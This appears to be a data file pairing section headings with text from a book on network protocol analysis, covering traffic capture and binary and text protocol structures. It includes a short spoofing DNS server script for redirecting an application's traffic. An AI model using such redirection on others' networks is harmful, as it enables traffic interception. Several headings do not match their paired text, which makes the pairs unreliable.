single IP address to all DNS requests (see Listing 2-11).\nReplace IPV4ADDRESS , IPV6ADDRESS , and REVERSEDNS  with appropriate\nstrings. As with the HTTP Reverse Proxy, you’ll need to run this as root\non a Unix-like system, as it will try to bind to port 53, which is not usually\nallowed for normal users. On Windows, there’s no such restriction on bind-\ning to ports less than 1024.\nDnsServer.csx // DnsServer.csx – Simple DNS Server\n// Expose console methods like WriteLine at global level.\nusing static System.Console;\n// Create the DNS server template\nvar template = new DnsServerTemplate();\n// Setup the response addresses\ntemplate.ResponseAddress = \"IPV4ADDRESS\";\ntemplate.ResponseAddress6 = \"IPV6ADDRESS\";\ntemplate.ReverseDns = \"REVERSEDNS\";\n// Create DNS server instance and start\nvar service = template.Create();\nservice.Start();\nWriteLine(\"Created {0}\", service);\nWriteLine(\"Press Enter to exit...\");\nReadLine();\nservice.Stop();\nListing 2-11: A simple DNS server\n1. A proxy loop occurs when a proxy repeatedly connects to itself, causing a recursive loop.\nThe outcome can only end in disaster, or at least running out of available resources.\n34 Chapter 2"
  },
  {
    "input": "So Which Approach Should You Use?",
    "output": "Now if you configure the DNS server for your application to point to\nyour spoofing DNS server, the application should send its traffic through.\nAdvantage of a Reverse HTTP Proxy\nThe advantage of a reverse HTTP proxy is that it doesn’t require a client\napplication to support a typical forwarding proxy configuration. This is\nespecially useful if the client application is not under your direct control or\nhas a fixed configuration that cannot be easily changed. As long as you can\nforce the original TCP connections to be redirected to the proxy, it’s pos-\nsible to handle requests to multiple different hosts with little difficulty.\nDisadvantages of a Reverse HTTP Proxy\nThe disadvantages of a reverse HTTP proxy are basically the same as for a\nforwarding proxy. The proxy must be able to parse the HTTP request and\nhandle the idiosyncrasies of the protocol.\nFinal words\nYou’ve read about passive and active capture techniques in this chapter,\nbut is one better than the other? That depends on the application you’re\ntrying to test. Unless you are just monitoring network traffic, it pays to take\nan active approach. As you continue through this book, you’ll realize that\nactive capture has significant benefits for protocol analysis and exploitation.\nIf you have a choice in your application, use SOCKS because it’s the easiest\napproach in many circumstances.\nCapturing Application Traffic 35"
  },
  {
    "input": "Chapter 3: Network Protocol Structures\r",
    "output": "3\nNE T WORK P ROTOCOL\nSTR uCTu RES\nThe old adage “There is nothing new under the sun”\nholds true when it comes to the way protocols are\nstructured. Binary and text protocols follow common\npatterns and structures and, once understood, can eas-\nily be applied to any new protocol. This chapter details\nsome of these structures and formalizes the way I’ll\nrepresent them throughout the rest of this book.\nIn this chapter, I discuss many of the common types of protocol struc-\ntures. Each is described in detail along with how it is represented in binary-\nor text-based protocols. By the end of the chapter, you should be able to\neasily identify these common types in any unknown protocol you analyze.\nOnce you understand how protocols are structured, you’ll also see pat-\nterns of exploitable behavior—ways of attacking the network protocol itself.\nChapter 10 will provide more detail on finding network protocol issues,\nbut for now we’ll just concern ourselves with structure."
  },
  {
    "input": "Numeric Data",
    "output": "Binary protocol structures\nBinary protocols work at the binary level; the smallest unit of data is a single\nbinary digit. Dealing with single bits is difficult, so we’ll use 8-bit units called\noctets, commonly called bytes. The octet is the de facto unit of network proto-\ncols. Although octets can be broken down into individual bits (for example,\nto represent a set of flags), we’ll treat all network data in 8-bit units, as shown\nin Figure 3-1.\nBit 7/MSB Bit 0/LSB\nBit format: 0 1 0 0 0 0 0 1 = 0x41/65\nOctet format: 0x41\nFigure 3-1: Binary data description formats\nWhen showing individual bits, I’ll use the bit format, which shows bit 7,\nthe most significant bit (MSB), on the left. Bit 0, or the least significant bit (LSB),\nis on the right. (Some architectures, such as PowerPC, define the bit num-\nbering in the opposite direction.)\nNumeric Data\nData values representing numbers are usually at the core of a binary proto-\ncol. These values can be integers or decimal values. Numbers can be used\nto represent the length of data, to identify tag values, or simply to represent\na number.\nIn binary, numeric values can be represented in a few different ways,\nand a protocol’s method of choice depends on the value it’s representing.\nThe following sections describe some of the more common formats.\nUnsigned Integers\nUnsigned integers are the most obvious representation of a binary num-\nber. Each bit has a specific value based on its position, and these values are\nadded together to represent the integer. Table 3-1 shows the decimal and\nhexadecimal values for an 8-bit integer.\nTable 3-1: Decimal Bit Values\nBit Decimal value Hex value\n0 1 0x01\n1 2 0x02\n2 4 0x04\n3 8 0x08\n4 16 0x10\n5 32 0x20\n6 64 0x40\n7 128 0x80\n38 Chapter 3\nSigned Integers\nNot all integer values are positive. In some scenarios, negative integers are\nrequired—for example, to represent the difference between two integers,\nyou need to take into account that the difference could be negative—and\nonly signed integers can hold negative values. While encoding an unsigned\ninteger seems obvious, the CPU can only work with the same set of bits.\nTherefore, the CPU requires a way of interpreting the unsigned integer\nvalue as signed; the most common signed interpretation is two’s comple-\nment. The term two’s complement refers to the way in which the signed inte-\nger is represented within a native integer value in the CPU.\nConversion between unsigned and signed values in two’s comple-\nment is done by taking the bitwise NOT (where a 0 bit is converted to\na 1 and 1 is converted to a 0) of the integer and adding 1. For example,\nFigure 3-2 shows the 8-bit integer 123 converted to its two’s complement\nrepresentation.\nMSB LSB\nNOT 0 1 1 1 1 0 1 1 = 0x7B/123\n+1 1 0 0 0 0 1 0 0 = 0x84/-124\n= 1 0 0 0 0 1 0 1 = 0x85/-123\nFigure 3-2: The two’s complement representation\nof 123\nThe two’s complement representation has one dangerous security con-\nsequence. For example, an 8-bit signed integer has the range –128 to 127, so\nthe magnitude of the minimum is larger than the maximum. If the mini-\nmum value is negated, the result is itself; in other words, –(–128) is –128.\nThis can cause calculations to be incorrect in parsed formats, leading to\nsecurity vulnerabilities. We’ll go into more detail in Chapter 10.\nVariable-Length Integers\nEfficient transfer of network data has historically been very important. Even\nthough today’s high-speed networks might make efficiency concerns unnec-\nessary, there are still advantages to reducing a protocol’s bandwidth. It can\nbe beneficial to use variable-length integers when the most common integer\nvalues being represented are within a very limited range.\nFor example, consider length fields: when sending blocks of data between\n0 and 127 bytes in size, you could use a 7-bit variable integer representation.\nFigure 3-3 shows a few different encodings for 32-bit words. At most, five\noctets are required to represent the entire range. But if your protocol tends\nto assign values between 0 and 127, it will only use one octet, which saves a\nconsiderable amount of space.\nNetwork Protocol Structures 39\nLowest address\n0x3F as 7-bit\n0x3F\nvariable integer\n0x80 as 7-bit\n0x80 0x01\nvariable integer\n0x01020304 as\n0x84 0x86 0x88 0x08\n7-bit variable integer\n0xFFFFFFFF as\n0xFF 0xFF 0xFF 0xFF 0x0F\n7-bit variable integer\nFigure 3-3: Example 7-bit integer encoding\nThat said, if you parse more than five octets (or even 32 bits), the\nresulting integer from the parsing operation will depend on the parsing\nprogram. Some programs (including those developed in C) will simply\ndrop any bits beyond a given range, whereas other development environ-\nments will generate an overflow error. If not handled correctly, this inte-\nger overflow might lead to vulnerabilities, such as buffer overflows, which\ncould cause a smaller than expected memory buffer to be allocated, in\nturn resulting in memory corruption.\nFloating-Point Data\nSometimes, integers aren’t enough to represent the range of decimal values\nneeded for a protocol. For example, a protocol for a multiplayer computer\ngame might require sending the coordinates of players or objects in the\ngame’s virtual world. If this world is large, it would be easy to run up against\nthe limited range of a 32- or even 64-bit fixed-point value.\nThe format of floating-point integers used most often is the IEEE for-\nmat specified in IEEE Standard for Floating-Point Arithmetic (IEEE 754).\nAlthough the standard specifies a number of different binary and even\ndecimal formats for floating-point values, you’re likely to encounter only\ntwo: a single-precision binary representation, which is a 32-bit value; and\na double-precision, 64-bit value. Each format specifies the position and bit\nsize of the significand and exponent. A sign bit is also specified, indicating\nwhether the value is positive or negative. Figure 3-4 shows the general lay-\nout of an IEEE floating-point value, and Table 3-2 lists the common expo-\nnent and significand sizes.\n40 Chapter 3"
  },
  {
    "input": "Binary Endian ",
    "output": "Sign\nIEEE floating-point format\nExponent Significand\nMSB LSB\nFigure 3-4: Floating-point representation\nTable 3-2: Common Float Point Sizes and Ranges\nBit size Exponent bits Significand bits Value range\n32 8 23 +/– 3 .402823 × 1038\n64 11 52 +/– 1 .79769313486232 × 10308\nBooleans\nBecause Booleans are very important to computers, it’s no surprise to see\nthem reflected in a protocol. Each protocol determines how to represent\nwhether a Boolean value is true or false, but there are some common\nconventions.\nThe basic way to represent a Boolean is with a single-bit value. A 0 bit\nmeans false and a 1 means true. This is certainly space efficient but not\nnecessarily the simplest way to interface with an underlying application.\nIt’s more common to use a single byte for a Boolean value because it’s far\neasier to manipulate. It’s also common to use zero to represent false and\nnon-zero to represent true.\nBit Flags\nBit flags are one way to represent specific Boolean states in a protocol. For\nexample, in TCP a set of bit flags is used to determine the current state of a\nconnection. When making a connection, the client sends a packet with the\nsynchronize flag (SYN) set to indicate that the connections should synchro-\nnize their timers. The server can then respond with an acknowledgment\n(ACK) flag to indicate it has received the client request as well as the SYN\nflag to establish the synchronization with the client. If this handshake used\nsingle enumerated values, this dual state would be impossible without a dis-\ntinct SYN/ACK state.\nBinary Endian\nThe endianness of data is a very important part of interpreting binary pro-\ntocols correctly. It comes into play whenever a multi-octet value, such as a\n32-bit word, is transferred. The endian is an artifact of how computers store\ndata in memory.\nNetwork Protocol Structures 41"
  },
  {
    "input": "Strings",
    "output": "Because octets are transmitted sequentially on the network, it’s possible\nto send the most significant octet of a value as the first part of the transmis-\nsion, as well as the reverse—send the least significant octet first. The order\nin which octets are sent determines the endianness of the data. Failure to\ncorrectly handle the endian format can lead to subtle bugs in the parsing of\nprotocols.\nModern platforms use two main endian formats: big and little. Big\nendian stores the most significant byte at the lowest address, whereas\nlittle endian stores the least significant byte in that location. Figure 3-5\nshows how the 32-bit integer 0x01020304 is stored in both forms.\nLowest address Highest address\n0x01020304\nas 32-bit 0x01 0x02 0x03 0x04\nbig endian word\n0x01020304\nas 32-bit 0x04 0x03 0x02 0x01\nlittle endian word\nFigure 3-5: Big and little endian word representation\nThe endianness of a value is commonly referred to as either network\norder or host order. Because the Internet RFCs invariably use big endian\nas the preferred type for all network protocols they specify (unless there\nare legacy reasons for doing otherwise), big endian is referred as network\norder. But your computer could be either big or little endian. Processor\narchitectures such as x86 use little endian; others such as SPARC use big\nendian.\nNOTE Some processor architectures, including SPARC, ARM, and MIPS, may have\nonboard logic that specifies the endianness at runtime, usually by toggling a proces-\nsor control flag. When developing network software, make no assumptions about the\nendianness of the platform you might be running on. The networking API used to\nbuild an application will typically contain convenience functions for converting to\nand from these orders. Other platforms, such as PDP-11, use a middle endian format\nwhere 16-bit words are swapped; however, you’re unlikely to ever encounter one in\neveryday life, so don’t dwell on it.\nText and Human-Readable Data\nAlong with numeric data, strings are the value type you’ll most commonly\nencounter, whether they’re being used for passing authentication creden-\ntials or resource paths. When inspecting a protocol designed to send only\n42 Chapter 3\nEnglish characters, the text will probably be encoded using ASCII. The\noriginal ASCII standard defined a 7-bit character set from 0 to 0x7F, which\nincludes most of the characters needed to represent the English language\n(shown in Figure 3-6).\nControl Printable\ncharacter character\nLower 4 bits\n0 1 2 3 4 5 6 7 8 9 A B C D E F\n0 NUL SOH STX ETX EOT ENQ ACK BEL BS TAB LF VT FF CR SO SI\n1 DLE DC1 DC2 DC3 DC4 NAK SYN ETB CAN EM SUB ESC FS GS RS US\n2 SP ! \" # $ % & ' ( ) * + , - . /\n3 0 1 2 3 4 5 6 7 8 9 : ; < = > ?\n4 @ A B C D E F G H I J K L M N O\n5 P Q R S T U V W X Y Z [ \\ ] ^ _\n6 ` a b c d e f g h i j k l m n o\n7 p q r s t u v w x y z { | } ~ DEL\nNetwork Protocol Structures 43\nstib\n4\nreppU\nFigure 3-6: A 7-bit ASCII table\nThe ASCII standard was originally developed for text terminals (physi-\ncal devices with a moving printing head). Control characters were used to\nsend messages to the terminal to move the printing head or to synchronize\nserial communications between the computer and the terminal. The ASCII\ncharacter set contains two types of characters: control and printable. Most of\nthe control characters are relics of those devices and are virtually unused.\nBut some still provide information on modern computers, such as CR and\nLF, which are used to end lines of text.\nThe printable characters are the ones you can see. This set of char-\nacters consists of many familiar symbols and alphanumeric characters;\nhowever, they won’t be of much use if you want to represent international\ncharacters, of which there are thousands. It’s unachievable to represent\neven a fraction of the possible characters in all the world’s languages in a\n7-bit number.\nThree strategies are commonly employed to counter this limitation:\ncode pages, multibyte character sets, and Unicode. A protocol will either\nrequire that you use one of these three ways to represent text, or it will offer\nan option that an application can select.\nCode Pages\nThe simplest way to extend the ASCII character set is by recognizing that if\nall your data is stored in octets, 128 unused values (from 128 to 255) can be\nrepurposed for storing extra characters. Although 256 values are not enough\nto store all the characters in every available language, you have many differ-\nent ways to use the unused range. Which characters are mapped to which\nvalues is typically codified in specifications called code pages or character\nencodings.\nMultibyte Character Sets\nIn languages such as Chinese, Japanese, and Korean (collectively referred\nto as CJK), you simply can’t come close to representing the entire written\nlanguage with 256 characters, even if you use all available space. The solu-\ntion is to use multibyte character sets combined with ASCII to encode these\nlanguages. Common encodings are Shift-JIS for Japanese and GB2312 for\nsimplified Chinese.\nMultibyte character sets allow you to use two or more octets in sequence to\nencode a desired character, although you’ll rarely see them in use. In fact,\nif you’re not working with CJK, you probably won’t see them at all. (For the\nsake of brevity, I won’t discuss multibyte character sets any further; plenty of\nonline resources will aid you in decoding them if required.)\nUnicode\nThe Unicode standard, first standardized in 1991, aims to represent all\nlanguages within a unified character set. You might think of Unicode as\nanother multibyte character set. But rather than focusing on a specific\nlanguage, such as Shift-JIS does with Japanese, it tries to encode all written\nlanguages, including some archaic and constructed ones, into a single uni-\nversal character set.\nUnicode defines two related concepts: character mapping and character\nencoding. Character mappings include mappings between a numeric value\nand a character, as well as many other rules and regulations on how char-\nacters are used or combined. Character encodings define the way these\nnumeric values are encoded in the underlying file or network protocol.\nFor analysis purposes, it’s far more important to know how these numeric\nvalues are encoded.\nEach character in Unicode is assigned a code point that represents\na unique character. Code points are commonly written in the format\nU+ABCD, where ABCD is the code point’s hexadecimal value. For the\nsake of compatibility, the first 128 code points match what is specified in\nASCII, and the second 128 code points are taken from ISO/IEC 8859-1.\nThe resulting value is encoded using a specific scheme, sometimes referred\nto as Universal Character Set (UCS) or Unicode Transformation Format (UTF)\nencodings. (Subtle differences exist between UCS and UTF formats,\n44 Chapter 3\nbut for the sake of identification and manipulation, these differences\nare unimportant.) Figure 3-7 shows a simple example of some different\nUnicode formats.\nCode points: Hello = U+0048 - U+0065 - U+006C - U+006C - U+006F\nUCS-2/UTF-16 Little endian\n0x48 0x00 0x65 0x00 0x6C 0x00 0x6C 0x00 0x6F 0x00\nUCS-2/UTF-16 Big endian\n0x00 0x48 0x00 0x65 0x00 0x6C 0x00 0x6C 0x00 0x6F\nUCS-4/UTF-32 Little endian\n0x48 0x00 0x00 0x00 0x65 0x00 0x00 0x00 0x6C 0x00 0x00 0x00\n0x6C 0x00 0x00 0x00 0x6F 0x00 0x00 0x00\nUTF-8\n0x48 0x65 0x6C 0x6C 0x6F\nFigure 3-7: The string \"Hello\" in different Unicode encodings\nThree common Unicode encodings in use are UTF-16, UTF-32,\nand UTF-8.\nUCS-2/UTF-16\nUCS-2/UTF-16 is the native format on modern Microsoft Windows plat-\nforms, as well as the Java and .NET virtual machines when they are run-\nning code. It encodes code points in sequences of 16-bit integers and\nhas little and big endian variants.\nUCS-4/UTF-32\nUCS-4/UTF-32 is a common format used in Unix applications because\nit’s the default wide-character format in many C/C++ compilers. It\nencodes code points in sequences of 32-bit integers and has different\nendian variants.\nUTF-8\nUTF-8 is probably the most common format on Unix. It is also the\ndefault input and output format for varying platforms and technolo-\ngies, such as XML. Rather than having a fixed integer size for code\npoints, it encodes them using a simple variable length value. Table 3-3\nshows how code points are encoded in UTF-8.\nNetwork Protocol Structures 45\nTable 3-3: Encoding Rules for Unicode Code Points in UTF-8\nBits of First Last Byte 1 Byte 2 Byte 3 Byte 4\ncode code code\npoint point (U+) point (U+)\n0–7 0000 007F 0xxxxxxx\n8–11 0080 07FF 110xxxxx 10xxxxxx\n12–16 0800 FFFF 1110xxxx 10xxxxxx 10xxxxxx\n17–21 10000 1FFFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx\n22–26 200000 3FFFFFF 111110xx 10xxxxxx 10xxxxxx 10xxxxxx\n26–31 4000000 7FFFFFFF 1111110x 10xxxxxx 10xxxxxx 10xxxxxx\nUTF-8 has many advantages. For one, its encoding definition ensures\nthat the ASCII character set, code points U+0000 through U+007F, are\nencoded using single bytes. This scheme makes this format not only ASCII\ncompatible but also space efficient. In addition, UTF-8 is compatible with\nC/C++ programs that rely on NUL-terminated strings.\nFor all of its benefits, UTF-8 does come at a cost, because languages\nlike Chinese and Japanese consume more space than they do in UTF-16.\nFigure 3-8 shows such a disadvantageous encoding of Chinese characters.\nBut notice that the UTF-8 in this example is still more space efficient than\nthe UTF-32 for the same characters.\nCode points: (cid:1924)(cid:4480) = U+5154 - U+5B50\nUCS-2/UTF-16 Little endian UCS-2/UTF-16 Big endian\n0x54 0x51 0x50 0x5B 0x51 0x54 0x5B 0x50\nUCS-4/UTF-32 Little endian\n0x54 0x51 0x00 0x00 0x50 0x5B 0x00 0x00\nUTF-8\n0xE5 0x85 0x94 0xE5 0xAD 0x90\nFigure 3-8: The string \"兔子\" in different Unicode encodings\nNOTE Incorrect or naive character encoding can be a source of subtle security issues, rang-\ning from bypassing filtering mechanisms (say in a requested resource path) to causing\nbuffer overflows. We’ll investigate some of the vulnerabilities associated with character\nencoding in Chapter 10.\n46 Chapter 3"
  },
  {
    "input": "Variable Binary Length Data",
    "output": "Variable Binary Length Data\nIf the protocol developer knows in advance exactly what data must be\ntransmitted, they can ensure that all values within the protocol are of a\nfixed length. In reality this is quite rare, although even simple authentica-\ntion credentials would benefit from the ability to specify variable username\nand password string lengths. Protocols use several strategies to produce\nvariable-length data values: I discuss the most common—terminated data,\nlength-prefixed data, implicit-length data, and padded data—in the follow-\ning sections.\nTerminated Data\nYou saw an example of variable-length data when variable-length integers\nwere discussed earlier in this chapter. The variable-length integer value was\nterminated when the octet’s MSB was 0. We can extend the concept of ter-\nminating values further to elements like strings or data arrays.\nA terminated data value has a terminal symbol defined that tells the\ndata parser that the end of the data value has been reached. The terminal\nsymbol is used because it’s unlikely to be present in typical data, ensuring\nthat the value isn’t terminated prematurely. With string data, the terminat-\ning value can be a NUL value (represented by 0) or one of the other control\ncharacters in the ASCII set.\nIf the terminal symbol chosen occurs during normal data transfer, you\nneed to use a mechanism to escape these symbols. With strings, it’s com-\nmon to see the terminating character either prefixed with a backslash (\\)\nor repeated twice to prevent it from being identified as the terminal sym-\nbol. This approach is especially useful when a protocol doesn’t know ahead\nof time how long a value is—for example, if it’s generated dynamically.\nFigure 3-9 shows an example of a string terminated by a NUL value.\nValid string data\n'H' 'e' 'l' 'l' 'o' NUL\n0x48 0x65 0x6C 0x6C 0x6F 0x00\nTerminating\ncharacter\nFigure 3-9: \"Hello\" as a NUL-terminated string\nBounded data is often terminated by a symbol that matches the first\ncharacter in the variable-length sequence. For example, when using string\ndata, you might find a quoted string sandwiched between quotation marks. The\ninitial double quote tells the parser to look for the matching character to end\nthe data. Figure 3-10 shows a string bounded by a pair of double quotes.\nNetwork Protocol Structures 47\nValid string data\n'\"' 'H' 'e' 'l' 'l' 'o' '\"'\n0x22 0x48 0x65 0x6C 0x6C 0x6F 0x22\nStarting Ending\nquote quote\nFigure 3-10: \"Hello\" as a double-quoted bounded string\nLength-Prefixed Data\nIf a data value is known in advance, it’s possible to insert its length into the\nprotocol directly. The protocol’s parser can read this value and then read\nthe appropriate number of units (say characters or octets) to extract the\noriginal value. This is a very common way to specify variable-length data.\nThe actual size of the length prefix is usually not that important, although\nit should be reasonably representative of the types of data being transmitted.\nMost protocols won’t need to specify the full range of a 32-bit integer; how-\never, you’ll often see that size used as a length field, if only because it fits well\nwith most processor architectures and platforms. For example, Figure 3-11\nshows a string with an 8-bit length prefix.\nNumber of\ncharacters 5 Characters\n'H' 'e' 'l' 'l' 'o'\n0x05\n0x48 0x65 0x6C 0x6C 0x6F\nFigure 3-11: \"Hello\" as a length-prefixed string\nImplicit-Length Data\nSometimes the length of the data value is implicit in the values around it.\nFor example, think of a protocol that is sending data back to a client using\na connection-oriented protocol such as TCP. Rather than specifying the\nsize of the data up front, the server could close the TCP connection, thus\nimplicitly signifying the end of the data. This is how data is returned in an\nHTTP version 1.0 response.\nAnother example would be a higher-level protocol or structure that\nhas already specified the length of a set of values. The parser might extract\nthat higher-level structure first and then read the values contained within\nit. The protocol could use the fact that this structure has a finite length\nassociated with it to implicitly calculate the length of a value in a similar\n48 Chapter 3"
  },
  {
    "input": "Dates and Times",
    "output": "fashion to close the connection (without closing it, of course). For example,\nFigure 3-12 shows a trivial example where a 7-bit variable integer and string\nare contained within a single block. (Of course, in practice, this can be con-\nsiderably more complex.)\n0x80 as 7-bit\nvariable integer String data\n'H' 'e' 'l' 'l' 'o'\n0x07 0x80 0x00\n0x48 0x65 0x6C 0x6C 0x6F\nTotal 7 Octets of\nsize data\nFigure 3-12: \"Hello\" as an implicit-length string\nPadded Data\nPadded data is used when there is a maximum upper bound on the length\nof a value, such as a 32-octet limit. For the sake of simplicity, rather than\nprefixing the value with a length or having an explicit terminating value,\nthe protocol could instead send the entire fixed-length string but termi-\nnate the value by padding the unused data with a known value. Figure 3-13\nshows an example.\nValid string data Padding data\n'H' 'e' 'l' 'l' 'o' '$' '$' '$' '$' '$' '$'\n0x48 0x65 0x6C 0x6C 0x6F 0x24 0x24 0x24 0x24 0x24 0x24\nFigure 3-13: \"Hello\" as a '$' padded string\ndates and times\nIt can be very important for a protocol to get the correct date and time.\nBoth can be used as metadata, such as file modification timestamps in a\nnetwork file protocol, as well as to determine the expiration of authenti-\ncation credentials. Failure to correctly implement the timestamp might\ncause serious security issues. The method of date and time representation\ndepends on usage requirements, the platform the applications are running\non, and the protocol’s space requirements. I discuss two common repre-\nsentations, POSIX/Unix Time and Windows FILETIME, in the following\nsections.\nNetwork Protocol Structures 49"
  },
  {
    "input": "Tag, Length, Value Pattern",
    "output": "POSIX/Unix Time\nCurrently, POSIX/Unix time is stored as a 32-bit signed integer value rep-\nresenting the number of seconds that have elapsed since the Unix epoch,\nwhich is usually specified as 00:00:00 (UTC), 1 January 1970. Although this\nisn’t a high-definition timer, it’s sufficient for most scenarios. As a 32-bit inte-\nger, this value is limited to 03:14:07 (UTC) 19 January 2038, at which point\nthe representation will overflow. Some modern operating systems now use\na 64-bit representation to address this problem.\nWindows FILETIME\nThe Windows FILETIME is the date and time format used by Microsoft\nWindows for its filesystem timestamps. As the only format on Windows with\nsimple binary representation, it also appears in a few different protocols.\nThe FILETIME format is a 64-bit unsigned integer. One unit of the\ninteger represents a 100 ns interval. The epoch of the format is 00:00:00\n(UTC), 1 January 1601. This gives the FILETIME format a larger range\nthan the POSIX/Unix time format.\ntag, length, value pattern\nIt’s easy to imagine how one might send unimportant data using simple pro-\ntocols, but sending more complex and important data takes some explain-\ning. For example, a protocol that can send different types of structures must\nhave a way to represent the bounds of a structure and its type.\nOne way to represent data is with a Tag, Length, Value (TLV) pattern. The\nTag value represents the type of data being sent by the protocol, which is\ncommonly a numeric value (usually an enumerated list of possible values).\nBut the Tag can be anything that provides the data structures with a unique\npattern. The Length and Value are variable-length values. The order in\nwhich the values appear isn’t important; in fact, the Tag might be part\nof the Value. Figure 3-14 show a couple of ways these values could be\narranged.\nThe Tag value sent can be used to determine how to further process the\ndata. For example, given two types of Tags, one that indicates the authenti-\ncation credentials to the application and another that represents a message\nbeing transmitted to the parser, we must be able to distinguish between\nthe two types of data. One big advantage to this pattern is that it allows\nus to extend a protocol without breaking applications that have not been\nupdated to support the updated protocol. Because each structure is sent\nwith an associated Tag and Length, a protocol parser could ignore the\nstructures that it doesn’t understand.\n50 Chapter 3"
  },
  {
    "input": "Multiplexing and Fragmentation",
    "output": "Tag outside\nvalue 3-octet value 4-octet value\n0x08 0x00 0x03 0x12 0x34 0x56 0x00 0x04 0x08 0x12 0x34 0x56\n16-bit 16-bit Tag inside\nlength length value\nFigure 3-14: Possible TLV arrangements\nMultiplexing and Fragmentation\nOften in computer communication, multiple tasks must happen at once.\nFor example, consider the Microsoft Remote Desktop Protocol (RDP): a user\ncould be moving the mouse cursor, typing on the keyboard, and transfer-\nring files to a remote computer while changes in the display and audio are\nbeing transmitted back to the user (see Figure 3-15).\nUser interface updates\nKeyboard and mouse updates\nSound\nRemote desktop\nShared files client\nRemote desktop server\nFigure 3-15: Data needs for Remote Desktop Protocol\nThis complex data transfer would not result in a very rich experience\nif display updates had to wait for a 10-minute audio file to finish before\nupdating the display. Of course, a workaround would be opening multiple\nconnections to the remote computer, but those would use more resources.\nInstead, many protocols use multiplexing, which allows multiple connections\nto share the same underlying network connection.\nMultiplexing (shown in Figure 3-16) defines an internal channel mecha-\nnism that allows a single connection to host multiple types of traffic by\nfragmenting large transmissions into smaller chunks. Multiplexing then\ncombines these chunks into a single connection. When analyzing a proto-\ncol, you may need to demultiplex these channels to get the original data\nback out.\nNetwork Protocol Structures 51"
  },
  {
    "input": "Network Address Information",
    "output": "User Shared\nSound\ninterface file\nupdate\nupdate update\n1 2 3 4 5\nRemote desktop client\nRemote desktop server\nUser\nSound\ninterface\nupdate\nupdate\nFigure 3-16: Multiplexed RDP data\nUnfortunately, some network protocols restrict the type of data that\ncan be transmitted and how large each packet of data can be—a problem\ncommonly encountered when layering protocols. For example, Ethernet\ndefines the maximum size of traffic frames as 1500 octets, and running IP\non top of that causes problems because the maximum size of IP packets\ncan be 65536 bytes. Fragmentation is designed to solve this problem: it\nuses a mechanism that allows the network stack to convert large packets\ninto smaller fragments when the application or OS knows that the entire\npacket cannot be handled by the next layer.\nnetwork address information\nThe representation of network address information in a protocol usually\nfollows a fairly standard format. Because we’re almost certainly dealing\nwith TCP or UDP protocols, the most common binary representation is the\nIP address as either a 4- or 16-octet value (for IPv4 or IPv6) along with a\n2-octet port. By convention, these values are typically stored as big endian\ninteger values.\nYou might also see hostnames sent instead of raw addresses. Because\nhostnames are just strings, they follow the patterns used for sending\nvariable-length strings, which was discussed earlier in “Variable Binary\nLength Data” on page 47. Figure 3-17 shows how some of these formats\nmight appear.\n52 Chapter 3"
  },
  {
    "input": "Structured Binary Formats",
    "output": "IPv4 address\n127.0.0.1 TCP port 80\n0x7F 0x00 0x00 0x01 0x00 0x50\nHostname\na.com TCP port 80\n'a' '.' 'c' 'o' 'm' 0x00 0x00 0x50\nTerminating\ncharacter\nIPv6 address\n(128 bits)\n::1 TCP port 80\n0x00 0x00 0x00 . . . 0x00 0x00 0x01 0x00 0x50\nFigure 3-17: Network information in binary\nstructured Binary Formats\nAlthough custom network protocols have a habit of reinventing the wheel,\nsometimes it makes more sense to repurpose existing designs when describ-\ning a new protocol. For example, one common format encountered in binary\nprotocols is Abstract Syntax Notation 1 (ASN.1). ASN.1 is the basis for protocols\nsuch as the Simple Network Management Protocol (SNMP), and it is the\nencoding mechanism for all manner of cryptographic values, such as X.509\ncertificates.\nASN.1 is standardized by the ISO, IEC, and ITU in the X.680 series. It\ndefines an abstract syntax to represent structured data. Data is represented\nin the protocol depending on the encoding rules, and numerous encodings\nexist. But you’re most likely to encounter the Distinguished Encoding Rules\n(DER), which is designed to represent ASN.1 structures in a way that can-\nnot be misinterpreted—a useful property for cryptographic protocols. The\nDER representation is a good example of a TLV protocol.\nNetwork Protocol Structures 53"
  },
  {
    "input": "Text Protocol Structures",
    "output": "Rather than going into great detail about ASN.1 (which would take up\na fair amount of this book), I give you Listing 3-1, which shows the ASN.1\nfor X.509 certificates.\nCertificate ::= SEQUENCE {\nversion [0] EXPLICIT Version DEFAULT v1,\nserialNumber CertificateSerialNumber,\nsignature AlgorithmIdentifier,\nissuer Name,\nvalidity Validity,\nsubject Name,\nsubjectPublicKeyInfo SubjectPublicKeyInfo,\nissuerUniqueID [1] IMPLICIT UniqueIdentifier OPTIONAL,\nsubjectUniqueID [2] IMPLICIT UniqueIdentifier OPTIONAL,\nextensions [3] EXPLICIT Extensions OPTIONAL\n}\nListing 3-1: ASN.1 representation for X.509 certificates\nThis abstract definition of an X.509 certificate can be represented in\nany of ASN.1’s encoding formats. Listing 3-2 shows a snippet of the DER\nencoded form dumped as text using the OpenSSL utility.\n$ openssl asn1parse -in example.cer\n0:d=0 hl=4 l= 539 cons: SEQUENCE\n4:d=1 hl=4 l= 388 cons: SEQUENCE\n8:d=2 hl=2 l= 3 cons: cont [ 0 ]\n10:d=3 hl=2 l= 1 prim: INTEGER :02\n13:d=2 hl=2 l= 16 prim: INTEGER :19BB8E9E2F7D60BE48BFE6840B50F7C3\n31:d=2 hl=2 l= 13 cons: SEQUENCE\n33:d=3 hl=2 l= 9 prim: OBJECT :sha1WithRSAEncryption\n44:d=3 hl=2 l= 0 prim: NULL\n46:d=2 hl=2 l= 17 cons: SEQUENCE\n48:d=3 hl=2 l= 15 cons: SET\n50:d=4 hl=2 l= 13 cons: SEQUENCE\n52:d=5 hl=2 l= 3 prim: OBJECT :commonName\n57:d=5 hl=2 l= 6 prim: PRINTABLESTRING :democa\nListing 3-2: A small sample of X.509 certificate\ntext protocol structures\nText protocols are a good choice when the main purpose is to transfer text,\nwhich is why mail transfer protocols, instant messaging, and news aggrega-\ntion protocols are usually text based. Text protocols must have structures\nsimilar to binary protocols. The reason is that, although their main content\ndiffers, both share the goal of transferring data from one place to another.\nThe following section details some common text protocol structures\nthat you’ll likely encounter in the real world.\n54 Chapter 3"
  },
  {
    "input": "Dates and Times",
